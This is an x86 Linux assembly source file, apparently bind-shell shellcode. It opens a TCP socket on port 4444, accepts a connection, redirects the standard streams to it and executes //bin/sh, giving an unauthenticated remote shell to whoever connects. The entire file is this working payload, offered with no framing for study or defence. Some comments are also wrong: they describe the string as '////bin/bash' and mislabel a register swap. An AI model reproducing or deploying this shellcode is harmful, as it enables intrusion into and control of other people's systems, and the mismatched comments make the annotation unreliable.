
global _start

section .text

_start:

	; Create a socket
	; eax = 102 (socketcall), ebx = 1 (socket), ecx = esp (2 (AF_INET), 1 (SOCK_STREAM), 0)
	xor ebx, ebx
	mul ebx

	push eax
	or al, 102	; syscall = socketcall
	inc ebx
	push ebx
	push byte 2	;       domain = (AF_INET = 2)
	mov ecx, esp	; pointer of args
	int 0x80


	; Save the returned socket to edi for later use, this is
	;   the first argument of the following syscalls
	xchg edi, eax	; eax (socket)  <=>  edi


	; Bind it to a local port
	inc ebx
	push esi
	push word 0x5c11; 0x5c11 = port 4444
	push bx		; AF_INET = 0x0002
	mov ecx, esp

	; eax = 102 (socketcall), ebx = 2 (bind), ecx = (socket, server struct, 16)
	add al, 102     ; syscall = socketcall
	push dword 16	; sockaddr_in: size of sockaddr_in
	push ecx	;              pointer of sockaddr_in
	push edi	;              server socket
	mov ecx, esp    ; pointer of args
	int 0x80


	; Start listening
	; eax = 102 (socketcall), ebx = 4 (listen), ecx = (socket, 2)
	add al, 102     ; syscall = socketcall
	push ebx	; backlog = 2
	shl bl, 1	; listen = 4
	push edi	; server socket
	mov ecx, esp	; pointer of args
	int 0x80


	; Accept the incoming connection
	; eax = 102 (socketcall), ebx = 5 (accept), ecx = (socket, 0, 0)
	add al, 102     ; syscall = socketcall
	inc bl		; ebx = 5 (accept)
	push esi	; length of socket_addr struct
	push esi	; pointer to the socket_addr struct
	push edi	; server socket
	mov ecx, esp
	int 0x80


	; Save the client socket
	xchg ebx, eax   ; eax (socket)  <=>  edi


	; Duplicate file descriptor
	; eax = 63 (dup2), ebx = old file descriptor (client socket)
	;   ecx = new file descriptor (0 = STDIN / 1 = STDOUT / 2 = STDERR)


	xor ecx, ecx
	add cl, 2	; new file descriptor

dup2_loop:

	xor eax, eax
	add al, 63	; syscall = dup2
	int 0x80

	dec ecx
	jns dup2_loop


	; execve syscall
	;xor eax, eax
	push eax        ; NULL

	push 0x68732f6e ; hs/n
	push 0x69622f2f ; ib//

	; First argument
	mov ebx, esp    ; pointer to '////bin/bash', 0x00

	push eax        ; NULL
	; Third argument
	mov edx, esp    ; pointer to a NULL

	push ebx        ; pointer to '////bin/bash', 0x00
	; Second argument
	mov ecx, esp    ; pointer to the pointer of '////bin/bash', 0x00

	mov al, 11      ; syscall = execve = 11
	int 0x80
